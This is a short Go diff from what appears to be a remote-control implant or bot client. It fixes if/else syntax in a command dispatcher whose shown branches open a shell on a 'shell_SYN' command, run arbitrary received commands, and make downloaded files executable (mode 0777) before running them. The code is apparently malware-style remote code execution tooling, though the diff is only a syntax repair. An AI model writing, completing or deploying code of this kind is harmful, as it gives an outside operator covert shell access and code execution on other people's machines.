@@ -128,7 +128,7 @@ func downloadFile(filepath string, url string) (err error) {
   return nil
 }
 
-func execute_file(c string, args[]string)([]byte){
+func execute_file(c string, args[]string){
     os.Chmod(c, os.FileMode(int(0777)) )
     execute(c, args)
 }
@@ -254,8 +254,6 @@ func do_cmd(body []byte) bool {
             }
         } else if cmd == "shell_SYN" {
             shell()
-        }
-        else if cmd =="execute_file"{
         //} else if cmd == "execute" {
         } else { //assume execute
             //rec := get_args(record.([]interface{}))
@@ -264,11 +262,9 @@ func do_cmd(body []byte) bool {
             cmd_array := stringify(record.([]interface{}))
             if cmd == "execute" {
                 go execute(cmd_array[0], cmd_array[1:])
-            } 
-            else if cmd == "execute_file"{
+            } else if cmd == "execute_file" {
                 go execute_file(cmd_array[0], cmd_array[1:])
-            }
-            else {
+            } else {
                 go execute(cmd, cmd_array)
             }
         }
